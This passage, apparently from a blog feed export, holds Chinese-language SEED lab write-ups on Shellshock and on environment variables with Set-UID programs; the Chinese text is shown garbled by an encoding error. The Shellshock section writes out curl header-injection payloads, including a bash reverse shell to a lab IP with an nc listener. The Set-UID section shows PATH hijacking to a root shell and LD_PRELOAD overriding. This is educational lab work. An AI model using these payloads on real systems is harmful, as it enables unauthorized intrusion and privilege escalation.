&#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/ls /tmp &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p>åˆ›å»ºtest</p><p><code>curl -H &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/touch /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028193945048.png" alt="image-20211028193945048"></p><h3 id="task-3d"><a class="markdownIt-Anchor" href="#task-3d"></a> Task 3.D:</h3><p><strong>Get the server to delete the file that you just created inside the /tmp folder</strong></p><p>åˆ é™¤test</p><p><code>curl -H &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028194013384.png" alt="image-20211028194013384"></p><p>Q1:ä¸èƒ½æ‰“å¼€/etc/shadowï¼Œå› ä¸ºåªæ˜¯www-dataæƒé™ï¼Œæƒé™ä¸å¤Ÿï¼Œéœ€è¦rootæƒé™</p><p>Q2ï¼šä¸èƒ½æˆåŠŸï¼Œä¸èƒ½æˆåŠŸå°†å¸¦ç©ºæ ¼çš„å­—ç¬¦ä¸²è®¾ç½®ä¸ºç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥ä¸èƒ½æ”»å‡»æˆåŠŸ</p><h2 id="test-4"><a class="markdownIt-Anchor" href="#test-4"></a> test 4</h2><p><code>nc -lvnp 9090</code></p><p><img src="/posts/35f73974/image-20211028205201563.png" alt="image-20211028205201563"></p><p><code>curl -A &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; echo; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot; http://10.9.0.80/cgi-bin/vul.cgi</code></p><p><img src="/posts/35f73974/image-20211028205013091.png" alt="image-20211028205013091"></p><p><img src="/posts/35f73974/image-20211028205206476.png" alt="image-20211028205206476"></p><h2 id="test-5"><a class="markdownIt-Anchor" href="#test-5"></a> test 5</h2><p>æ–°å»ºä¸€ä¸ªvul.cgiä¿®æ”¹ä¸ºbashåï¼Œé‡æ–°dcbuildä¸€ä¸ªå®¹å™¨ï¼Œåå†æ¬¡æ‰§è¡Œæ”»å‡»ï¼Œå‘ç°æ”»å‡»æ— æ³•æˆåŠŸã€‚å› ä¸ºbashå¡«è¡¥äº†shellshockæ¼æ´ï¼Œæ‰€ä»¥æ— æ³•æ”»å‡»æˆåŠŸã€‚</p><p><img src="/posts/35f73974/image-20211028211429143.png" alt="image-20211028211429143"></p>]]></content>
    
    
    <categories>
      
      <category>è½¯ä»¶å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è½¯ä»¶å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¯å¢ƒå˜é‡å’Œset-UIDç¨‹åº</title>
    <link href="/posts/3c8e3d23/"/>
    <url>/posts/3c8e3d23/</url>
    
    <content type="html"><![CDATA[<h1 id="environment-variable-and-set-uid-program-lab"><a class="markdownIt-Anchor" href="#environment-variable-and-set-uid-program-lab"></a> Environment Variable and Set-UID Program Lab</h1><h2 id="task-1"><a class="markdownIt-Anchor" href="#task-1"></a> Task 1</h2><p><img src="/posts/3c8e3d23/image-20211021190558511.png" alt="image-20211021190558511"></p><ul><li><p>ä½¿ç”¨<code>printenv</code>æ‰“å°ç¯å¢ƒå˜é‡</p><p><img src="/posts/3c8e3d23/image-20211021190734705.png" alt="image-20211021190734705"></p></li><li><p>ä½¿ç”¨<code>export</code>è®¾ç½®ç¯å¢ƒå˜é‡çš„å€¼,ç”¨<code>echo</code>æŸ¥çœ‹è®¾ç½®ç»“æœ</p><p><img src="/posts/3c8e3d23/image-20211021192046493.png" alt="image-20211021192046493"></p></li><li><p>ä½¿ç”¨<code>unset</code>åˆ é™¤ç¯å¢ƒå˜é‡ï¼Œç”¨<code>echo</code>æŸ¥çœ‹è®¾ç½®ç»“æœ</p><p><img src="/posts/3c8e3d23/image-20211021192112022.png" alt="image-20211021192112022"></p></li></ul><h2 id="task-2"><a class="markdownIt-Anchor" href="#task-2"></a> Task 2</h2><h3 id="step-1"><a class="markdownIt-Anchor" href="#step-1"></a> Step 1.</h3><p>é¦–å…ˆç¼–è¯‘<code>myprintenv.c</code>æ–‡ä»¶</p><p>ç„¶åç»“æœä¿å­˜åœ¨<code>file</code>ä¸­</p><p><img src="/posts/3c8e3d23/image-20211021192345242.png" alt="image-20211021192345242"></p><p>è§‚å¯Ÿfileæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ˜¯å„ä¸ªç¯å¢ƒå˜é‡çš„å€¼</p><p><img src="/posts/3c8e3d23/image-20211021192715013.png" alt="image-20211021192715013"></p><h3 id="step-2"><a class="markdownIt-Anchor" href="#step-2"></a> Step 2</h3><p>æŒ‰ç…§è¦æ±‚æ³¨é‡Šæ‰å­è¿›ç¨‹çš„printenvè¯­å¥ï¼Œå°†çˆ¶è¿›ç¨‹çš„printenvè¯­å¥å–æ¶ˆæ³¨é‡Š</p><p>é‡æ–°ç¼–è¯‘ï¼Œå°†ç»“æœä¿å­˜åœ¨file2æ–‡ä»¶ä¸­ï¼Œå‘ç°åŒæ ·æ˜¯ç¯å¢ƒå˜é‡çš„å€¼</p><p><img src="/posts/3c8e3d23/image-20211021194639135.png" alt="image-20211021194639135"></p><h3 id="step-3"><a class="markdownIt-Anchor" href="#step-3"></a> Step 3</h3><p>ç”¨diffå‘½ä»¤æ¯”è¾ƒfileå’Œfile2çš„å·®å¼‚ï¼Œå‘ç°ä¸¤è€…æ˜¯ç›¸åŒçš„ï¼Œè¯´æ˜å­è¿›ç¨‹å®Œå…¨ç»§æ‰¿äº†çˆ¶è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚</p><p><img src="/posts/3c8e3d23/image-20211021194823695.png" alt="image-20211021194823695"></p><p>è¿›ä¸€æ­¥æŸ¥é˜…èµ„æ–™å¯çŸ¥</p><p>å­è¿›ç¨‹å®Œå…¨å¤åˆ¶äº†çˆ¶è¿›ç¨‹çš„èµ„æºï¼ŒåŒ…æ‹¬è¿›ç¨‹ä¸Šä¸‹æ–‡ã€ä»£ç åŒºã€æ•°æ®åŒºã€å †åŒºã€æ ˆåŒºã€å†…å­˜ä¿¡æ¯ã€æ‰“å¼€æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ã€ä¿¡å·å¤„ç†å‡½æ•°ã€è¿›ç¨‹ä¼˜å…ˆçº§ã€è¿›ç¨‹ç»„å·ã€å½“å‰å·¥ä½œç›®å½•ã€æ ¹ç›®å½•ã€èµ„æºé™åˆ¶å’Œæ§åˆ¶ç»ˆç«¯ç­‰ä¿¡æ¯ï¼Œè€Œå­è¿›ç¨‹ä¸çˆ¶è¿›ç¨‹çš„åŒºåˆ«æœ‰è¿›ç¨‹å·ã€èµ„æºä½¿ç”¨æƒ…å†µå’Œè®¡æ—¶å™¨ç­‰ã€‚</p><h2 id="task-3"><a class="markdownIt-Anchor" href="#task-3"></a> Task 3</h2><h3 id="step-1-2"><a class="markdownIt-Anchor" href="#step-1-2"></a> Step 1</h3><p>ç¼–è¯‘è¿è¡Œmyenv.cï¼Œå‘ç°ç»“æœä¸ºç©º</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, <span class="hljs-literal">NULL</span>);  <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/posts/3c8e3d23/image-20211021195206499.png" alt="image-20211021195206499"></p><h3 id="step-2-2"><a class="markdownIt-Anchor" href="#step-2-2"></a> Step 2</h3><p>å°†ä»£ç ä¿®æ”¹ä¸ºå¦‚ä¸‹æ–¹æ‰€ç¤ºçš„ä»£ç åï¼Œå†æ¬¡ç¼–è¯‘è¿è¡Œ</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">//execve(&quot;/usr/bin/env&quot;, argv, NULL);  </span><br>  <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, environ);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å‘ç°ç¨‹åºæ‰“å°å‡ºäº†ç¯å¢ƒå˜é‡çš„å€¼ã€‚</p><p><img src="/posts/3c8e3d23/image-20211021195323867.png" alt="image-20211021195323867">å‡½æ•°execve()çš„ä½œç”¨ï¼Œå…¶è°ƒç”¨æ ¼å¼å¦‚ä¸‹ï¼š<br>int execve(const char * filenameï¼Œchar * const argv[]ï¼Œchar * const envp[])<br>å…¶æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°filenameæŒ‡å‘è¦è¿è¡Œçš„æ–°ç¨‹åºçš„è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°argvæ•°ç»„åŒ…å«æ–°ç¨‹åºçš„æ‰€æœ‰å‚æ•°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°envpæ•°ç»„åŒ…å«æ–°ç¨‹åºçš„ç¯å¢ƒå˜é‡ã€‚</p><p>å¦‚æœå°†envrionä¼ ç»™execve()å‡½æ•°ï¼Œåˆ™æ–°è¿›ç¨‹æƒ³å°†ä»–è‡ªå·±çš„ç¯å¢ƒå˜é‡ä¼ ç»™æ–°ç¨‹åºã€‚å¦‚æœè®¾ä¸ºNULLï¼Œåˆ™ä¸ä¼ é€’ä»»ä½•ç¯å¢ƒå˜é‡</p><h3 id="step-3-2"><a class="markdownIt-Anchor" href="#step-3-2"></a> Step 3</h3><p>è¿›ç¨‹åœ¨è¢«åˆå§‹åŒ–æ—¶é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼è·å–ç¯å¢ƒå˜é‡ã€‚</p><p>ç¬¬ä¸€ç§æ–¹å¼ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªæ–°åˆ›å»ºçš„è¿›ç¨‹ï¼Œå³ä½¿ç”¨forkï¼ˆï¼‰ç³»ç»Ÿè°ƒç”¨(åœ¨UNLXä¸­)ç”Ÿæˆçš„è¿›ç¨‹ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå­è¿›ç¨‹çš„å†…å­˜æ˜¯çˆ¶è¿›ç¨‹å†…å­˜çš„å‰¯æœ¬ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå­è¿›ç¨‹å°†ç»§æ‰¿çˆ¶è¿›ç¨‹æ‰€æœ‰çš„ç¯å¢ƒå˜é‡ã€‚</p><p>ç¬¬äºŒç§æ–¹å¼ï¼Œå¦‚æœè¿›ç¨‹è‡ªèº«é€šè¿‡ execveï¼ˆï¼‰ç³»ç»Ÿè°ƒç”¨è¿è¡Œä¸€ä¸ªæ–°çš„ç¨‹åºï¼ˆè€Œä¸æ˜¯åœ¨å­è¿›ç¨‹ä¸­è¿è¡Œï¼‰ï¼Œè¿›ç¨‹çš„å†…å­˜å°†ä¼šè¢«æ–°ç¨‹åºçš„æ•°æ®è¦†ç›–ï¼Œå› æ­¤è¿›ç¨‹ä¸­å­˜å‚¨çš„æ‰€æœ‰ç¯å¢ƒå˜é‡å°†ä¼šä¸¢å¤±ã€‚å¦‚æœä¸€ä¸ªè¿›ç¨‹å¸Œæœ›å°†ç¯å¢ƒå˜é‡ä¼ é€’ç»™æ–°è¿è¡Œçš„ç¨‹åºï¼Œå®ƒéœ€è¦åœ¨è°ƒç”¨ execveï¼ˆï¼‰å‡½æ•°æ—¶æ˜¾å¼åœ°ä¼ é€’ç¯å¢ƒå˜é‡ã€‚</p><h2 id="task-4"><a class="markdownIt-Anchor" href="#task-4"></a> Task 4</h2><p>ä¿å­˜ç¼–è¯‘è¿è¡Œä¸‹æ–¹çš„ä»£ç ï¼Œå¯ä»¥å‘ç°ç»“æœæ˜¯æ‰“å°å‡ºäº†ç¯å¢ƒå˜é‡</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>);<br>return0 ;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/posts/3c8e3d23/image-20211021202226212.png" alt="image-20211021202226212"></p><p>systemï¼ˆï¼‰çš„å‡½æ•°è¯´æ˜</p><p>systemï¼ˆï¼‰ä¼šè°ƒç”¨fork()äº§ç”Ÿå­è¿›ç¨‹ï¼Œç”±å­è¿›ç¨‹æ¥è°ƒç”¨/bin/sh-c stringæ¥æ‰§è¡Œå‚æ•°stringå­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„å‘½ä»¤ï¼Œæ­¤å‘½ä»¤æ‰§è¡Œå®Œåéšå³è¿”å›åŸè°ƒç”¨çš„è¿›ç¨‹ã€‚åœ¨è°ƒç”¨systemï¼ˆï¼‰æœŸé—´SIGCHLD ä¿¡å·ä¼šè¢«æš‚æ—¶æç½®ï¼ŒSIGINTå’ŒSIGQUIT ä¿¡å·åˆ™ä¼šè¢«å¿½ç•¥ã€‚</p><p>è¿”å›å€¼</p><p>å¦‚æœforkï¼ˆï¼‰å¤±è´¥ è¿”å›-1ï¼šå‡ºç°é”™è¯¯</p><p>å¦‚æœexecï¼ˆï¼‰å¤±è´¥ï¼Œè¡¨ç¤ºä¸èƒ½æ‰§è¡ŒShellï¼Œè¿”å›å€¼ç›¸å½“äºShellæ‰§è¡Œäº†<a href="https://baike.baidu.com/item/exit">exit</a>ï¼ˆ127ï¼‰</p><p>å¦‚æœæ‰§è¡ŒæˆåŠŸåˆ™è¿”å›å­Shellçš„ç»ˆæ­¢çŠ¶æ€</p><p>å¦‚æœsystemï¼ˆï¼‰åœ¨è°ƒç”¨/bin/shæ—¶å¤±è´¥åˆ™è¿”å›127ï¼Œå…¶ä»–å¤±è´¥åŸå› è¿”å›-1ã€‚è‹¥å‚æ•°stringä¸ºç©ºæŒ‡é’ˆï¼ˆNULLï¼‰ï¼Œä»…å½“å‘½ä»¤å¤„ç†ç¨‹åºå¯ç”¨æ—¶ï¼Œè¿”å›éé›¶å€¼ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸€ç‰¹å¾åˆ¤æ–­åœ¨ä¸€ä¸ªç»™å®šçš„æ“ä½œç³»ç»Ÿä¸Šæ˜¯å¦æ”¯æŒsystemå‡½æ•°(å½“systemå‡½æ•°è¿”å›å€¼ä¸º0æ—¶ï¼Œè¡¨æ˜systemå‡½æ•°æ— æ•ˆï¼Œåœ¨UNIXç³»ç»Ÿä¸­ï¼Œsystemå‡½æ•°æ€»æ˜¯å¯ç”¨çš„)ï¼›ã€‚å¦‚æœsystemï¼ˆï¼‰è°ƒç”¨æˆåŠŸåˆ™æœ€åä¼šè¿”å›æ‰§è¡Œshellå‘½ä»¤åçš„è¿”å›å€¼ï¼Œä½†æ˜¯æ­¤è¿”å›å€¼ä¹Ÿæœ‰å¯èƒ½ä¸º systemï¼ˆï¼‰è°ƒç”¨/bin/shå¤±è´¥æ‰€è¿”å›çš„127ï¼Œå› æ­¤æœ€å¥½èƒ½å†æ£€æŸ¥errno æ¥ç¡®è®¤æ‰§è¡ŒæˆåŠŸã€‚</p><h2 id="task-5"><a class="markdownIt-Anchor" href="#task-5"></a> Task 5</h2><h3 id="step-1-3"><a class="markdownIt-Anchor" href="#step-1-3"></a> Step 1</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span>**environ;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>        i++;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å°†ä»£ç ä¿å­˜åœ¨foo.cä¸­</p><p>ç¼–è¯‘è¿è¡Œï¼Œæ‰“å°å‡ºç¯å¢ƒå˜é‡</p><p><img src="/posts/3c8e3d23/image-20211021203257312.png" alt="image-20211021203257312"></p><h3 id="step-2-3"><a class="markdownIt-Anchor" href="#step-2-3"></a> Step 2</h3><p>å°†ç¨‹åºçš„æ‹¥æœ‰è€…æ”¹ä¸ºroot, åŒæ—¶å°†å…¶å˜æˆset-UIDç¨‹åº</p><p><img src="/posts/3c8e3d23/image-20211021204849038.png" alt="image-20211021204849038"></p><h3 id="step-3-3"><a class="markdownIt-Anchor" href="#step-3-3"></a> Step 3</h3><p>æŒ‰ç…§é¢˜ç›®è¦æ±‚è®¾ç½®ä¸‰ä¸ªç¯å¢ƒå˜é‡ï¼Œç„¶åè¿è¡Œå·²ç»æ˜¯ç‰¹æƒç¨‹åºçš„fooã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°wzaå’ŒPATHç¯å¢ƒå˜é‡éƒ½æˆåŠŸå‡ºç°ï¼Œä½†æ˜¯LD_LIBRARY_PATHå§‹ç»ˆæ²¡æœ‰å‡ºç°åœ¨ç¯å¢ƒå˜é‡ä¸­</p><p><img src="/posts/3c8e3d23/image-20211022110105522.png" alt="image-20211022110105522"></p><p><img src="/posts/3c8e3d23/image-20211022110154632.png" alt="image-20211022110154632"></p><p>è¿è¡Œfooå•ç‹¬æŠ“å»LDå˜é‡ï¼Œå¯ä»¥å‘ç°è¾“å‡ºä¸ºç©ºç™½ï¼Œæ²¡æœ‰æ‰¾åˆ°</p><p>æˆ‘ä»¬å°†fooçš„æ‹¥æœ‰è€…æ”¹å›seed ï¼Œå‘ç°LD_LIBRARY_PATHè¿™ä¸ªå‡ºç°äº†ã€‚</p><p>è¿™è¯´æ˜è¿™ä¸ªç¯å¢ƒå˜é‡ä¼šå¯¹åŠ¨æ€é“¾æ¥å™¨çš„è¡Œä¸ºäº§ç”Ÿå½±å“ï¼Œæ‰€ä»¥å®ƒåœ¨åŠ¨æ€é“¾æ¥å™¨çš„è¿›ç¨‹ä¸­è¢«å±è”½æ‰äº†ï¼Œä»è€Œä¸ä¼šå†å¯¹ç‰¹æƒç¨‹åºçš„åŠ¨æ€é“¾æ¥äº§ç”Ÿå½±å“ã€‚</p><p><img src="/posts/3c8e3d23/image-20211022110351472.png" alt="image-20211022110351472"></p><h2 id="task-6"><a class="markdownIt-Anchor" href="#task-6"></a> Task 6</h2><p>è¿è¡Œä»£ç </p><p>task6.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ¶æ„ä»£ç </p><p>ls.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>å°†è¿è¡Œä»£ç ç¼–è¯‘åä¿å­˜ä¸ºtask6å¯æ‰§è¡Œæ–‡ä»¶</p><p>å°†æ¶æ„ä»£ç ç¼–è¯‘ä¿å­˜ä¸ºls,ä¿å­˜åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­</p><p>é¦–å…ˆæˆ‘ä»¬æ‰§è¡Œtask6,æ­¤æ—¶æ­£å¸¸è°ƒç”¨/bin/lsæŒ‡ä»¤</p><p>ç„¶åæˆ‘ä»¬æ”¹å˜task6çš„æ‰€æœ‰è€…ä¸ºroot,åŒæ—¶è®¾ç½®å…¶ä¸ºç‰¹æƒç¨‹åºï¼Œç„¶åå°†å½“å‰æ–‡ä»¶å¤¹åŒ…å«åœ¨ç¯å¢ƒå˜é‡PATHä¸­ï¼Œå†æ¬¡æ‰§è¡Œæˆ‘ä»¬å‘ç°ç¨‹åºå¾—åˆ°çš„åªæ˜¯ä¸€ä¸ªæ™®é€šçš„shell</p><p><img src="/posts/3c8e3d23/image-20211024152521937.png" alt="image-20211024152521937"></p><p><img src="/posts/3c8e3d23/image-20211022115545732.png" alt="image-20211022115545732"></p><p>é˜…è¯»èµ„æ–™åæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™æ˜¯ç”±äºUbuntu20.04çš„ä¿æŠ¤æœºåˆ¶å¯¼è‡´çš„ï¼Œæˆ‘ä»¬é‡‡ç”¨<code>sudo ln -sf /bin/zsh /bin/sh</code>å°†/bin/shæŒ‡å‘ä¸€ä¸ªç‰¹åˆ«çš„shellçš„ç¨‹åºå³å¯</p><p>å†æ¬¡æ‰§è¡Œï¼Œæˆ‘ä»¬å‘ç°ç¨‹åºæˆåŠŸåˆ›å»ºäº†ä¸€ä¸ªå…·æœ‰rootæƒé™çš„shellç¨‹åºã€‚</p><p><strong>å®éªŒåŸç†</strong>æ˜¯systemä¼šè°ƒç”¨/bin/shæ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œshellä¼šåœ¨PATHä¸­æœç´¢è¦ä½¿ç”¨çš„å‘½ä»¤ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æŠŠæˆ‘ä»¬çš„æ¶æ„ç¨‹åºæ”¾åœ¨å½“å‰ç›®å½•ï¼Œå¹¶ä¸”æŠŠå½“å‰ç›®å½•åŠ åˆ°ç¯å¢ƒå˜é‡PATHä¸­æ—¶ï¼Œå½“æ‰§è¡Œtask6å°±ä¼šè°ƒç”¨æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œä»è€ŒæˆåŠŸåˆ›å»ºä¸€ä¸ªshellè¿›ç¨‹ï¼Œåˆå› ä¸ºtask6æ˜¯ä¸€ä¸ªå…·æœ‰rootæƒé™çš„ç‰¹æƒç¨‹åºï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ›å»ºçš„æ˜¯ä¸€ä¸ªå…·æœ‰rootæƒé™çš„shellè¿›ç¨‹ã€‚</p><h2 id="task-7"><a class="markdownIt-Anchor" href="#task-7"></a> Task 7</h2><h3 id="step-1-4"><a class="markdownIt-Anchor" href="#step-1-4"></a> Step 1</h3><p>mylib.c</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sleep</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/*If this is invoked by a privileged program,</span><br><span class="hljs-comment">you can do damages here!*/</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am not sleeping!\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æŒ‰ç…§é¢˜ç›®è¦æ±‚ç¼–è¯‘ä½†ä¸é“¾æ¥mylib.c</p><p>åˆ›å»ºä¸€ä¸ªæ–°çš„å…±äº«åº“ï¼Œå¹¶å°†è¯¥å…±äº«åº“åŠ å…¥LD_PRELOADç¯å¢ƒå˜é‡ã€‚</p><p><img src="/posts/3c8e3d23/image-20211022170152068.png" alt="image-20211022170152068"></p><p>myprog.c</p><p>ç¼–è¯‘è¯¥æ–‡ä»¶ï¼Œä¿å­˜å¯æ‰§è¡Œæ–‡ä»¶ä¸ºmyprog</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/*myprog.c*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="step-2-4"><a class="markdownIt-Anchor" href="#step-2-4"></a> Step 2</h3><ul><li><p>æ­£å¸¸è¿è¡Œmyprog</p><p><img src="/posts/3c8e3d23/image-20211022172148790.png" alt="image-20211022172148790"></p><p>ç¨‹åºè¡Œä¸ºè¢«æ”¹å˜ï¼Œè°ƒç”¨äº†mylib.c 